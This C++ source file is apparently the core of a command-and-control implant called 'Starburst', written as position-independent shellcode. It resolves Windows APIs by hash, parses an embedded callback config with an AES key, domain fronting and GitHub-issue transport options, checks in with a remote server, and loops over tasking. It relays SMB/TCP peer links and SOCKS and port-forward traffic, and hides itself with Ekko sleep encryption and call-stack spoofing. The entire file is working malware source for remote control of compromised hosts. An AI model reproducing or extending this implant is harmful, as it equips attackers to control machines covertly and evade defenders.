#include <common.h>
#include <constexpr.h>
#include <resolve.h>
#include <crypto.h>
#include <base64.h>
#include <parser.h>
#include <package.h>
#include <strings.h>
#include <checkin.h>
#include <commands.h>
#include <module.h>
#include <socks.h>
#include <rpfwd.h>
#include <ssh.h>
#include <transport_tcp.h>

using namespace stardust;
using namespace starburst;

extern "C" auto declfn entry(
    _In_ void* args
) -> void {
    stardust::instance()
        .start( args );
}

declfn instance::instance(
    void
) {
    base.address = RipStart();
    base.length  = ( RipData() - base.address ) + END_OFFSET;

    if ( ! (( ntdll.handle = resolve::module( expr::hash_string<wchar_t>( L"ntdll.dll" ) ) )) ) {
        return;
    }

    if ( ! (( kernel32.handle = resolve::module( expr::hash_string<wchar_t>( L"kernel32.dll" ) ) )) ) {
        return;
    }

    RESOLVE_IMPORT( ntdll );
    RESOLVE_IMPORT( kernel32 );

    // load advapi32
    advapi32.handle = reinterpret_cast<uintptr_t>(
        kernel32.LoadLibraryA( symbol<const char*>( "advapi32.dll" ) )
    );
    if ( advapi32.handle ) {
        RESOLVE_IMPORT( advapi32 );
    }

    // load bcrypt
    bcrypt_mod.handle = reinterpret_cast<uintptr_t>(
        kernel32.LoadLibraryA( symbol<const char*>( "bcrypt.dll" ) )
    );
    if ( bcrypt_mod.handle ) {
        RESOLVE_IMPORT( bcrypt_mod );
    }

#if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT )
    winhttp.handle = reinterpret_cast<uintptr_t>(
        kernel32.LoadLibraryA( symbol<const char*>( "winhttp.dll" ) )
    );
    if ( winhttp.handle ) {
        RESOLVE_IMPORT( winhttp );
    }
#endif

#if defined( GITHUB_TRANSPORT )
    wininet.handle = reinterpret_cast<uintptr_t>(
        kernel32.LoadLibraryA( symbol<const char*>( "wininet.dll" ) )
    );
    if ( wininet.handle ) {
        RESOLVE_IMPORT( wininet );
    }
#endif

#if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT )
    h_session = nullptr;
    h_connect = nullptr;
#endif
#if defined( SMB_TRANSPORT )
    h_pipe     = INVALID_HANDLE_VALUE;
#endif
    smb_links  = nullptr;
#ifdef INCLUDE_CMD_SOCKS
    socks_state = nullptr;
#endif
#ifdef INCLUDE_CMD_RPFWD
    rpfwd_state = nullptr;
#endif
#ifdef INCLUDE_CMD_SSH
    ssh_state = nullptr;
#endif
#ifdef INCLUDE_CMD_BROWSERPIVOT
    browserpivot_state = nullptr;
#endif
#if defined( INCLUDE_CMD_CONNECT ) || defined( INCLUDE_CMD_DISCONNECT ) || defined( TCP_TRANSPORT )
    tcp_links = nullptr;
    tcp_link_state = nullptr;
#endif
#if defined( TCP_TRANSPORT )
    tcp_listen_sock = TCP_INVALID_SOCKET;
    tcp_client_sock = TCP_INVALID_SOCKET;
#endif
    response_queue.buffer   = nullptr;
    response_queue.length   = 0;
    response_queue.capacity = 0;
    crypto.h_aes    = nullptr;
    crypto.h_sha256 = nullptr;

    {
        auto x64_default = symbol<const char*>( "C:\\Windows\\System32\\rundll32.exe" );
        auto x86_default = symbol<const char*>( "C:\\Windows\\SysWOW64\\rundll32.exe" );
        uint32_t i = 0;
        while ( x64_default[i] && i < 259 ) { spawnto.x64[i] = x64_default[i]; i++; }
        spawnto.x64[i] = '\0';
        i = 0;
        while ( x86_default[i] && i < 259 ) { spawnto.x86[i] = x86_default[i]; i++; }
        spawnto.x86[i] = '\0';
        spawnto.x64_args[0] = '\0';
        spawnto.x86_args[0] = '\0';
    }
}

auto declfn instance::parse_config() -> bool {
    uint8_t config_data[] = S_AGENT_CONFIG;
    uint32_t config_len = sizeof( config_data );

    if ( config_len < 37 ) return false;

    Parser p;
    parser_init( &p, config_data, config_len );

    // payload UUID (36 bytes raw, not length-prefixed)
    auto uuid_raw = parser_raw( &p, 36 );
    if ( !uuid_raw ) return false;
    memory::copy( agent.payload_uuid, uuid_raw, 36 );
    agent.payload_uuid[36] = '\0';
    memory::copy( agent.uuid, agent.payload_uuid, 37 );

    // AES key (32 bytes raw)
    auto key_raw = parser_raw( &p, 32 );
    if ( !key_raw ) return false;
    memory::copy( agent.aes_key, key_raw, 32 );

    // sleep interval (ms)
    agent.sleep_ms = parser_int32( &p );

    // jitter percent
    agent.jitter_pct = parser_int32( &p );

    // killdate (unix timestamp)
    agent.killdate = parser_int32( &p );

    // transport-specific config
    uint32_t slen = 0;

#if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT )
    {
        auto host = parser_string( &p, &slen );
        if ( host && slen > 0 ) {
            memory::copy( transport.callback_host, host, slen );
            transport.callback_host[slen] = '\0';
        }

        transport.callback_port = parser_int32( &p );
        transport.use_ssl = parser_byte( &p ) != 0;

        auto ua = parser_string( &p, &slen );
        if ( ua && slen > 0 ) {
            memory::copy( transport.user_agent, ua, slen );
            transport.user_agent[slen] = '\0';
        }

        auto get_u = parser_string( &p, &slen );
        if ( get_u && slen > 0 ) {
            memory::copy( transport.get_uri, get_u, slen );
            transport.get_uri[slen] = '\0';
        }

        auto post_u = parser_string( &p, &slen );
        if ( post_u && slen > 0 ) {
            memory::copy( transport.post_uri, post_u, slen );
            transport.post_uri[slen] = '\0';
        }

        auto qp = parser_string( &p, &slen );
        if ( qp && slen > 0 ) {
            memory::copy( transport.query_param, qp, slen );
            transport.query_param[slen] = '\0';
        }

        transport.proxy_enabled = parser_byte( &p ) != 0;
        if ( transport.proxy_enabled ) {
            auto ph = parser_string( &p, &slen );
            if ( ph && slen > 0 ) { memory::copy( transport.proxy_host, ph, slen ); transport.proxy_host[slen] = '\0'; }
            transport.proxy_port = parser_int32( &p );
            auto pu = parser_string( &p, &slen );
            if ( pu && slen > 0 ) { memory::copy( transport.proxy_user, pu, slen ); transport.proxy_user[slen] = '\0'; }
            auto pp = parser_string( &p, &slen );
            if ( pp && slen > 0 ) { memory::copy( transport.proxy_pass, pp, slen ); transport.proxy_pass[slen] = '\0'; }
        }
    }

#if defined( HTTPX_TRANSPORT )
    {
        auto df = parser_string( &p, &slen );
        if ( df && slen > 0 ) {
            memory::copy( transport.domain_front, df, slen );
            transport.domain_front[slen] = '\0';
        }

        auto hdrs = parser_string( &p, &slen );
        if ( hdrs && slen > 0 ) {
            uint32_t copy = slen < 1023 ? slen : 1023;
            memory::copy( transport.custom_headers, hdrs, copy );
            transport.custom_headers[copy] = '\0';
            transport.custom_headers_len = copy;
        } else {
            transport.custom_headers_len = 0;
        }
    }
#endif
#endif

#if defined( GITHUB_TRANSPORT )
    {
        auto pat = parser_string( &p, &slen );
        if ( pat && slen > 0 ) { memory::copy( transport.github_pat, pat, slen ); transport.github_pat[slen] = '\0'; }

        auto owner = parser_string( &p, &slen );
        if ( owner && slen > 0 ) { memory::copy( transport.github_owner, owner, slen ); transport.github_owner[slen] = '\0'; }

        auto repo = parser_string( &p, &slen );
        if ( repo && slen > 0 ) { memory::copy( transport.github_repo, repo, slen ); transport.github_repo[slen] = '\0'; }

        transport.server_issue = parser_int32( &p );
        transport.client_issue = parser_int32( &p );
    }
#endif

#if defined( SMB_TRANSPORT )
    {
        auto pn = parser_string( &p, &slen );
        if ( pn && slen > 0 ) {
            memory::copy( transport.pipename, pn, slen );
            transport.pipename[slen] = '\0';
        }
    }
#endif

#if defined( TCP_TRANSPORT )
    transport.callback_port = parser_int32( &p );
#endif

    agent.checked_in = false;
    agent.running    = true;

    DBG_PRINTF( "config parsed: uuid=%s sleep=%dms jitter=%d%%\n",
        agent.payload_uuid, agent.sleep_ms, agent.jitter_pct );

    return true;
}

auto declfn instance::do_checkin() -> bool {
    auto pkg = build_checkin_package( *this );
    if ( !pkg ) return false;

    uint32_t data_len = 0;
    auto data = package_build( pkg, &data_len );

    uint8_t* response = nullptr;
    uint32_t resp_len = 0;

    bool ok = transport_send( *this, data, data_len, &response, &resp_len );

    package_destroy( *this, pkg );

    if ( !ok || !response || resp_len < 2 ) {
        if ( response ) heap_free( response );
        return false;
    }

    // parse checkin response
    Parser rsp;
    parser_init( &rsp, response, resp_len );

    uint8_t action = parser_byte( &rsp );
    if ( action != ACTION_CHECKIN_RSP ) {
        heap_free( response );
        return false;
    }

    // new callback UUID
    uint32_t uuid_len = 0;
    auto new_uuid = parser_string( &rsp, &uuid_len );
    if ( new_uuid && uuid_len == 36 ) {
        memory::copy( agent.uuid, new_uuid, 36 );
        agent.uuid[36] = '\0';
        agent.checked_in = true;

        DBG_PRINTF( "checked in -> callback UUID: %s\n", agent.uuid );
    }

    heap_free( response );

    return agent.checked_in;
}

auto declfn instance::sleep_with_jitter() -> void {
    uint32_t sleep_time = agent.sleep_ms;

    if ( agent.jitter_pct > 0 ) {
        ULONG seed = kernel32.GetTickCount();
        ULONG rng  = ntdll.RtlRandomEx( &seed );
        uint32_t jitter_range = (sleep_time * agent.jitter_pct) / 100;
        uint32_t jitter = rng % (jitter_range + 1);
        sleep_time = sleep_time - jitter_range / 2 + jitter;
    }

#if SLEEP_MASK_TYPE == MASK_EKKO && defined(_WIN64)
    /* Ekko replaces the entire sleep cycle: encrypt → sleep → decrypt
     * via timer-queue ROP. The pre/post hooks and NtDelayExecution are
     * handled internally by evasion_ekko_sleep. */
    evasion_ekko_sleep( *this, sleep_time );
#else
    evasion_pre_sleep( *this );

    LARGE_INTEGER delay;
    delay.QuadPart = -static_cast<LONGLONG>( sleep_time ) * 10000LL;

#if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)
    if ( evasion.spoof.initialized ) {
        FUNCTION_CALL fc = {};
        fc.ptr  = reinterpret_cast<PVOID>( ntdll.NtDelayExecution );
        fc.ssn  = 0;
        fc.argc = 2;
        fc.args[0] = spoof_arg( FALSE );
        fc.args[1] = spoof_arg( &delay );
        spoof_call( *this, &fc );
    } else
#endif
    {
        ntdll.NtDelayExecution( FALSE, &delay );
    }

    evasion_post_sleep( *this );
#endif
}

auto declfn instance::beacon_loop() -> void {
    while ( agent.running ) {

        // poll linked P2P agents for delegate messages
        {
            auto cur = smb_links;
            while ( cur ) {
                auto next_link = cur->next;

                if ( cur->connected && cur->h_pipe && cur->h_pipe != INVALID_HANDLE_VALUE ) {
                    uint32_t pkts = 0;
                    while ( pkts < MAX_SMB_PKTS_PER_LOOP ) {
                        DWORD avail = 0;
                        if ( !kernel32.PeekNamedPipe( cur->h_pipe, nullptr, 0, nullptr, &avail, nullptr ) ) {
                            cur->connected = false;
                            DBG_PRINTF( "link: pipe broken for agent %s\n",
                                cur->agent_id ? cur->agent_id : "?" );
                            break;
                        }
                        if ( avail == 0 ) break;

                        // read size header
                        uint8_t hdr[4] = {};
                        DWORD rb = 0;
                        if ( !kernel32.ReadFile( cur->h_pipe, hdr, 4, &rb, nullptr ) || rb != 4 ) {
                            cur->connected = false;
                            break;
                        }

                        uint32_t msg_size = ((uint32_t)hdr[0] << 24) |
                                            ((uint32_t)hdr[1] << 16) |
                                            ((uint32_t)hdr[2] << 8)  |
                                            ((uint32_t)hdr[3]);

                        if ( msg_size == 0 || msg_size > 0x3C00000 ) break;

                        auto msg_buf = static_cast<uint8_t*>( heap_alloc( msg_size ) );
                        if ( !msg_buf ) break;

                        uint32_t total = 0;
                        while ( total < msg_size ) {
                            uint32_t chunk = msg_size - total;
                            if ( chunk > PIPE_BUFFER_MAX ) chunk = PIPE_BUFFER_MAX;
                            rb = 0;
                            BOOL rok = kernel32.ReadFile( cur->h_pipe, msg_buf + total, chunk, &rb, nullptr );
                            if ( !rok ) {
                                DWORD err = kernel32.GetLastError();
                                if ( err == ERROR_MORE_DATA ) { total += rb; continue; }
                                break;
                            }
                            total += rb;
                        }

                        if ( total < msg_size ) {
                            heap_free( msg_buf );
                            cur->connected = false;
                            break;
                        }

                        // update agent_id if UUID changed (P2P switched to callback_uuid)
                        if ( msg_size >= 48 && cur->agent_id ) {
                            uint32_t dec_len = 0;
                            auto dec = starburst::base64_decode( *this, msg_buf, 48, &dec_len );
                            if ( dec && dec_len >= 36 ) {
                                if ( starburst::str_ncmp( cur->agent_id,
                                        reinterpret_cast<char*>( dec ), 36 ) != 0 ) {
                                    auto nid = static_cast<char*>( heap_alloc( 37 ) );
                                    if ( nid ) {
                                        memory::copy( nid, dec, 36 );
                                        nid[36] = 0;
                                        heap_free( cur->agent_id );
                                        cur->agent_id = nid;
                                        DBG_PRINTF( "link: UUID updated to %s\n", nid );
                                    }
                                }
                                heap_free( dec );
                            } else if ( dec ) {
                                heap_free( dec );
                            }
                        }

                        // queue as ACTION_LINK_MSG delegate
                        auto dpkg = starburst::package_create( *this );
                        if ( dpkg ) {
                            starburst::package_add_byte( *this, dpkg, ACTION_LINK_MSG );
                            starburst::package_add_string( *this, dpkg, cur->agent_id ?
                                cur->agent_id : symbol<char*>( const_cast<char*>( "" ) ) );
                            starburst::package_add_bytes( *this, dpkg, msg_buf, msg_size );

                            uint32_t dlen = 0;
                            auto ddata = starburst::package_build( dpkg, &dlen );

                            uint32_t needed = response_queue.length + 4 + dlen;
                            if ( needed > response_queue.capacity ) {
                                uint32_t nc = response_queue.capacity == 0 ? 1024 : response_queue.capacity;
                                while ( nc < needed ) nc *= 2;
                                response_queue.buffer = static_cast<uint8_t*>(
                                    heap_realloc( response_queue.buffer, nc ) );
                                response_queue.capacity = nc;
                            }
                            auto qb = response_queue.buffer + response_queue.length;
                            qb[0] = (dlen >> 24) & 0xFF;
                            qb[1] = (dlen >> 16) & 0xFF;
                            qb[2] = (dlen >> 8)  & 0xFF;
                            qb[3] = dlen & 0xFF;
                            memory::copy( qb + 4, ddata, dlen );
                            response_queue.length += 4 + dlen;

                            starburst::package_destroy( *this, dpkg );
                        }

                        heap_free( msg_buf );
                        pkts++;
                    }
                }
                cur = next_link;
            }
        }

#if defined( INCLUDE_CMD_CONNECT ) || defined( TCP_TRANSPORT )
        if ( tcp_links && tcp_link_state ) {
            starburst::tcp_poll_links( *this );
        }
#endif

#ifdef INCLUDE_CMD_SOCKS
        // poll SOCKS connections for data before building request
        if ( socks_state ) {
            starburst::socks_poll( *this );
        }
#endif
#ifdef INCLUDE_CMD_RPFWD
        if ( rpfwd_state ) {
            starburst::rpfwd_poll( *this );
        }
#endif
        /* SSH is one-shot deployment - no polling needed */

        // build get_tasking request
        auto pkg = starburst::package_create( *this );
        if ( !pkg ) {
            sleep_with_jitter();
            continue;
        }

        starburst::package_add_byte( *this, pkg, ACTION_GET_TASKING );

        // attach queued responses, capped to MAX_SEND_SIZE per cycle
        if ( response_queue.length > 0 ) {
            uint32_t send_len = response_queue.length;
            if ( send_len > MAX_SEND_SIZE ) {
                // find last complete entry that fits within MAX_SEND_SIZE
                // each entry is [4-byte len][data]
                uint32_t pos = 0;
                uint32_t last_good = 0;
                while ( pos + 4 <= send_len ) {
                    uint32_t entry_len = ( response_queue.buffer[pos] << 24 ) |
                                         ( response_queue.buffer[pos+1] << 16 ) |
                                         ( response_queue.buffer[pos+2] << 8 ) |
                                           response_queue.buffer[pos+3];
                    if ( pos + 4 + entry_len > MAX_SEND_SIZE && last_good > 0 ) break;
                    pos += 4 + entry_len;
                    last_good = pos;
                }
                send_len = last_good > 0 ? last_good : pos;
            }

            starburst::package_add_bytes( *this, pkg, response_queue.buffer, send_len );

            // shift remaining data to front
            uint32_t remaining = response_queue.length - send_len;
            if ( remaining > 0 ) {
                memory::copy( response_queue.buffer, response_queue.buffer + send_len, remaining );
            }
            response_queue.length = remaining;
        } else {
            starburst::package_add_int32( *this, pkg, 0 );
        }

        uint32_t data_len = 0;
        auto data = starburst::package_build( pkg, &data_len );

        uint8_t* response = nullptr;
        uint32_t resp_len = 0;

        bool ok = starburst::transport_send( *this, data, data_len, &response, &resp_len );

        starburst::package_destroy( *this, pkg );

        if ( ok && response && resp_len > 0 ) {
            Parser rsp;
            starburst::parser_init( &rsp, response, resp_len );

            uint8_t action = starburst::parser_byte( &rsp );
            if ( action == ACTION_GET_TASKING ) {
                uint32_t task_count = starburst::parser_int32( &rsp );

                for ( uint32_t i = 0; i < task_count && agent.running; i++ ) {
                    uint8_t cmd_id = starburst::parser_byte( &rsp );

                    auto task_uuid_raw = starburst::parser_raw( &rsp, 36 );
                    char task_uuid[37] = { 0 };
                    if ( task_uuid_raw ) {
                        memory::copy( task_uuid, task_uuid_raw, 36 );
                    }

                    uint32_t params_len = starburst::parser_int32( &rsp );
                    auto params = starburst::parser_raw( &rsp, params_len );

                    dispatch_task( cmd_id, task_uuid, params, params_len );
                }

                // check for appended sections (delegates, socks)
                while ( starburst::parser_remaining( &rsp ) > 0 ) {
                    uint8_t section_action = starburst::parser_byte( &rsp );

                    if ( section_action == ACTION_LINK_MSG ) {
                        while ( starburst::parser_remaining( &rsp ) >= 8 ) {
                            uint32_t before = starburst::parser_remaining( &rsp );
                            uint32_t uuid_len = 0;
                            auto target_uuid = starburst::parser_string( &rsp, &uuid_len );
                            uint32_t msg_len = 0;
                            auto msg_data = reinterpret_cast<uint8_t*>(
                                starburst::parser_string( &rsp, &msg_len ) );

                            if ( starburst::parser_remaining( &rsp ) >= before ) break;

                            if ( target_uuid && msg_data && msg_len > 0 ) {
                                bool routed = false;

                                // check SMB links first
                                auto lnk = smb_links;
                                while ( lnk ) {
                                    if ( lnk->connected && lnk->agent_id && uuid_len > 0 &&
                                         str_ncmp( lnk->agent_id, target_uuid, uuid_len ) == 0 ) {
                                        uint8_t whdr[4];
                                        whdr[0] = (msg_len >> 24) & 0xFF;
                                        whdr[1] = (msg_len >> 16) & 0xFF;
                                        whdr[2] = (msg_len >> 8)  & 0xFF;
                                        whdr[3] = msg_len & 0xFF;

                                        DWORD written = 0;
                                        kernel32.WriteFile( lnk->h_pipe, whdr, 4, &written, nullptr );
                                        if ( written == 4 ) {
                                            uint32_t off = 0;
                                            while ( off < msg_len ) {
                                                uint32_t c = msg_len - off;
                                                if ( c > PIPE_BUFFER_MAX ) c = PIPE_BUFFER_MAX;
                                                written = 0;
                                                if ( !kernel32.WriteFile( lnk->h_pipe, msg_data + off,
                                                        c, &written, nullptr ) ) break;
                                                off += written;
                                            }
                                        }
                                        routed = true;
                                        break;
                                    }
                                    lnk = lnk->next;
                                }

                                /* SSH is one-shot deployment - no delegate routing */

#if defined( INCLUDE_CMD_CONNECT ) || defined( TCP_TRANSPORT )
                                if ( !routed ) {
                                    auto tlnk = tcp_links;
                                    while ( tlnk ) {
                                        if ( tlnk->connected && tlnk->agent_id && uuid_len > 0 &&
                                             str_ncmp( tlnk->agent_id, target_uuid, uuid_len ) == 0 ) {
                                            starburst::tcp_link_send_msg( *this, tlnk, msg_data, msg_len );
                                            routed = true;
                                            break;
                                        }
                                        tlnk = tlnk->next;
                                    }
                                }
#endif
                            }
                        }
                    }
#ifdef INCLUDE_CMD_SOCKS
                    else if ( section_action == ACTION_SOCKS_MSG && socks_state ) {
                        uint32_t socks_count = starburst::parser_int32( &rsp );
                        for ( uint32_t si = 0; si < socks_count; si++ ) {
                            uint32_t sid = starburst::parser_int32( &rsp );
                            uint8_t  sexit = starburst::parser_byte( &rsp );
                            uint32_t sdata_len = 0;
                            auto sdata = reinterpret_cast<uint8_t*>(
                                starburst::parser_string( &rsp, &sdata_len ) );
                            starburst::socks_route( *this, sid, sdata, sdata_len, sexit != 0 );
                        }
                    }
#endif
#ifdef INCLUDE_CMD_RPFWD
                    else if ( section_action == ACTION_RPFWD_MSG && rpfwd_state ) {
                        uint32_t rpfwd_count = starburst::parser_int32( &rsp );
                        for ( uint32_t ri = 0; ri < rpfwd_count; ri++ ) {
                            uint32_t rid = starburst::parser_int32( &rsp );
                            uint8_t  rexit = starburst::parser_byte( &rsp );
                            uint32_t rdata_len = 0;
                            auto rdata = reinterpret_cast<uint8_t*>(
                                starburst::parser_string( &rsp, &rdata_len ) );
                            starburst::rpfwd_route( *this, rid, rdata, rdata_len, rexit != 0 );
                        }
                    }
#endif
                    else {
                        break;
                    }
                }
            }

            heap_free( response );
        }

        if ( agent.running ) {
            sleep_with_jitter();
        }
    }
}

auto declfn instance::start(
    _In_ void* arg
) -> void {
    DBG_PRINTF( "Starburst starting...\n" );
    DBG_PRINTF( "shellcode @ %p [%d bytes]\n", base.address, base.length );
    DBG_PRINTF( "running from %ls (PID: %d)\n",
        NtCurrentPeb()->ProcessParameters->ImagePathName.Buffer,
        NtCurrentTeb()->ClientId.UniqueProcess );

    // parse embedded config
    if ( !parse_config() ) {
        DBG_PRINTF( "config parse failed\n" );
        return;
    }

    // initialize crypto
    if ( !crypto_init( *this ) ) {
        DBG_PRINTF( "crypto init failed\n" );
        return;
    }

    // initialize evasion modules
    evasion_on_init( *this );

    DBG_PRINTF( "crypto init succeeded, initializing transport...\n" );

    // initialize transport
    if ( !transport_init( *this ) ) {
        DBG_PRINTF( "transport init failed\n" );
        return;
    }
    DBG_PRINTF( "transport init succeeded\n" );

    // perform initial checkin
    uint32_t retries = 0;
    while ( !agent.checked_in && retries < 10 ) {
        if ( do_checkin() ) break;
        retries++;
        sleep_with_jitter();
    }

    if ( !agent.checked_in ) {
        DBG_PRINTF( "checkin failed after %d retries\n", retries );
        goto cleanup;
    }

    // enter beacon loop
    beacon_loop();

cleanup:
    // close linked P2P pipes
    {
        auto lnk = smb_links;
        while ( lnk ) {
            auto nxt = lnk->next;
            if ( lnk->h_pipe && lnk->h_pipe != INVALID_HANDLE_VALUE )
                kernel32.CloseHandle( lnk->h_pipe );
            if ( lnk->agent_id ) heap_free( lnk->agent_id );
            if ( lnk->pipe_name ) heap_free( lnk->pipe_name );
            heap_free( lnk );
            lnk = nxt;
        }
        smb_links = nullptr;
    }

    evasion_on_cleanup( *this );
    crypto_destroy( *this );
    transport_destroy( *this );

    // free response queue
    if ( response_queue.buffer ) {
        heap_free( response_queue.buffer );
    }

    DBG_PRINTF( "Starburst exiting\n" );
}
